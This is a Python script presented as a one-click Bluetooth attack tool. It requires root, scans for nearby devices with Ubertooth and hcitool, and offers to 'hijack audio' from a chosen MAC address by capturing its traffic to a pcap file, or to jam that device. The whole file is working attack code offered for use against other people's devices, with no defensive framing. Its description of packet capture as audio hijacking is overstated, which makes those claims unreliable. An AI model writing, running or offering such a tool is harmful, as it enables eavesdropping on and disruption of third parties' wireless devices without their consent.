#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# UBERTOOTH ONE-CLICK-ATTACK v666 - SCAN & DESTROY

import os
import sys
import re
import time
import signal
import subprocess
from datetime import datetime
import colorama
from colorama import Fore, Style

colorama.init()

class UberOneClickAttacker:
    def __init__(self):
        self.targets = []
        self.running = True
        signal.signal(signal.SIGINT, self.cleanup)
        self.check_root()
        self.show_banner()

    def check_root(self):
        if os.geteuid() != 0:
            print(f"{Fore.RED}🚫 Run as root: sudo {sys.argv[0]}{Style.RESET_ALL}")
            sys.exit(1)

    def show_banner(self):
        os.system('clear')
        print(f"""{Fore.MAGENTA}
   ___ _ _ _   ___ ___ _____ ___ ___ 
  | _ | | | |_| _ ) _|_   _|_ _/ _ \\
  | _ |_  _|_  _) _| | |  | | (_) |
  |___| |_| |_| |_|___| |_| |_|\___/
                                     
 ------------------------------------
    UBERTOOTH ONE-CLICK-ATTACK v666
   • Scan & Immediate Attack •
   • No Extra Menus Needed  •
 ------------------------------------
{Style.RESET_ALL}""")

    def scan_devices(self):
        """Scan with combined ubertooth-scan and hcitool"""
        self.show_banner()
        print(f"{Fore.CYAN}🔍 Scanning for targets (15 seconds)...{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}MAC-Address       Device Name{Style.RESET_ALL}")
        print("-" * 40)
        
        # Start scan processes
        ubertooth_proc = subprocess.Popen(["ubertooth-scan", "-t", "15"], 
                                        stdout=subprocess.PIPE,
                                        stderr=subprocess.PIPE,
                                        text=True)
        
        hcitool_proc = subprocess.Popen(["hcitool", "scan", "--flush"],
                                      stdout=subprocess.PIPE,
                                      stderr=subprocess.PIPE,
                                      text=True)
        
        # Process outputs
        self.targets = []
        device_names = {}
        
        # Get device names first
        for line in hcitool_proc.stdout:
            if ':' in line:
                parts = line.strip().split('\t')
                if len(parts) >= 2:
                    device_names[parts[1]] = parts[2] if len(parts) > 2 else 'Unknown'
        
        # Process ubertooth results
        for line in ubertooth_proc.stdout:
            if 'BD_ADDR' in line:
                mac = re.search(r'(([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2})', line)
                if mac:
                    mac_addr = mac.group(1)
                    name = device_names.get(mac_addr, 'Unknown')
                    self.targets.append({
                        'mac': mac_addr,
                        'name': name
                    })
                    # Display immediately
                    print(f"{mac_addr}  {name}")
        
        return len(self.targets) > 0

    def attack_menu(self):
        """Show immediate attack options after scan"""
        self.show_banner()
        print(f"{Fore.GREEN}=== SCAN RESULTS ==={Style.RESET_ALL}")
        for i, target in enumerate(self.targets, 1):
            print(f"{i}. {target['mac']} - {target['name']}")
        
        print(f"\n{Fore.RED}=== ATTACK OPTIONS ==={Style.RESET_ALL}")
        print("1. Audio Hijacking")
        print("2. Bluetooth Jamming")
        print("3. Back to Scan")
        
        choice = input("\nSelect target number or option: ")
        
        if choice == "1":
            target_idx = int(input("Target number to hijack: ")) - 1
            self.audio_hijack(self.targets[target_idx])
        elif choice == "2":
            target_idx = int(input("Target number to jam: ")) - 1
            self.jam_target(self.targets[target_idx])
        elif choice == "3":
            return
        else:
            print(f"{Fore.RED}Invalid choice!{Style.RESET_ALL}")
            time.sleep(1)

    def audio_hijack(self, target):
        """Capture audio from target"""
        filename = f"hijack_{target['mac'].replace(':', '')}.pcap"
        print(f"{Fore.RED}🎙️ Hijacking {target['name']}... (Stop with Ctrl+C){Style.RESET_ALL}")
        os.system(f"ubertooth-bt -S -t {target['mac']} -c {filename}")

    def jam_target(self, target):
        """Jam target device"""
        print(f"{Fore.RED}📶 Jamming {target['name']}... (Stop with Ctrl+C){Style.RESET_ALL}")
        os.system(f"ubertooth-jam -b -t {target['mac']}")

    def cleanup(self, sig=None, frame=None):
        print(f"\n{Fore.RED}💀 Killing all processes...{Style.RESET_ALL}")
        os.system("pkill -f 'ubertooth|hcitool'")
        sys.exit(0)

    def main(self):
        while self.running:
            if self.scan_devices():
                self.attack_menu()
            else:
                print(f"{Fore.RED}No devices found! Retrying...{Style.RESET_ALL}")
                time.sleep(2)

if __name__ == "__main__":
    # Check dependencies
    required = ['ubertooth-scan', 'hcitool']
    missing = [cmd for cmd in required if not subprocess.getoutput(f"which {cmd}")]
    if missing:
        print(f"{Fore.RED}Missing tools: {', '.join(missing)}{Style.RESET_ALL}")
        sys.exit(1)
    
    attacker = UberOneClickAttacker()
    try:
        attacker.main()
    except Exception as e:
        print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")
    finally:
        attacker.cleanup()
